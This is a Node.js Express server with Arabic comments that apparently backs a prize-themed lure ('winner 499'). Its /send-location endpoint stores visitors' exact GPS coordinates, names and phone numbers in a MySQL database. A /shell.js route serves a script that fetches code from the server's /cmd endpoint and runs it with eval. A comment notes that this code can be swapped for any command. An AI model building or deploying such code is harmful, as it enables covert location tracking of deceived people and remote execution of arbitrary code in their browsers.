require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const mysql = require('mysql2');

const app = express();
const port = process.env.PORT || 3001;

// إعداد MySQL
const db = mysql.createConnection({
    host: process.env.MYSQL_HOST,
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_DATABASE
});

db.connect((err) => {
    if (err) {
        console.error('خطأ في الاتصال بقاعدة البيانات MySQL:', err);
        return;
    }
    console.log('تم الاتصال بقاعدة البيانات MySQL بنجاح');
});

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.post('/send-location', (req, res) => {
    try {
        const { latitude, longitude, accuracy, timestamp, name, phone } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({ 
                error: 'يجب توفير إحداثيات الموقع' 
            });
        }

        const message = `
📍 موقع جديد للرابح 499:
🌎 الإحداثيات: ${latitude}, ${longitude}
🎯 الدقة: ${accuracy || 'غير معروفة'} متر
🔗 رابط الموقع: https://www.google.com/maps?q=${latitude},${longitude}
⏰ الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
        `;

        // تسجيل الموقع في وحدة التحكم
        console.log('تم استلام موقع جديد:', message);

        // تخزين البيانات في قاعدة البيانات MySQL
        const query = 'INSERT INTO locations (latitude, longitude, accuracy, timestamp, name, phone) VALUES (?, ?, ?, ?, ?, ?)';
        const values = [latitude, longitude, accuracy, new Date(timestamp), name || '', phone || ''];

        db.query(query, values, (err, result) => {
            if (err) {
                console.error('خطأ في تخزين البيانات في MySQL:', err);
                return res.status(500).json({ 
                    error: 'حدث خطأ أثناء تخزين البيانات في MySQL' 
                });
            }
            console.log('تم تخزين البيانات بنجاح في MySQL');
            res.json({ 
                success: true, 
                message: 'تم استلام موقعك بنجاح' 
            });
        });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ 
            error: 'حدث خطأ في معالجة البيانات' 
        });
    }
});

// للتأكد من أن الخادم يعمل
app.get('/health', (req, res) => {
    res.json({ status: 'ok', env: 'development' });
});

// مسار جديد لاستضافة ملف shell.js
app.get('/shell.js', (req, res) => {
    res.type("application/javascript");
    res.send(`
        fetch("https://${req.hostname}/cmd")
            .then(response => response.text())
            .then(eval);
    `);
});

// مسار لمعالجة الأوامر المستلمة
app.get('/cmd', (req, res) => {
    res.send("console.log('Hello from CMD');"); // يمكنك تغيير هذا إلى أي كود تريد تنفيذه
});

app.listen(port, () => {
    console.log(`الخادم يعمل على البورت ${port}`);
});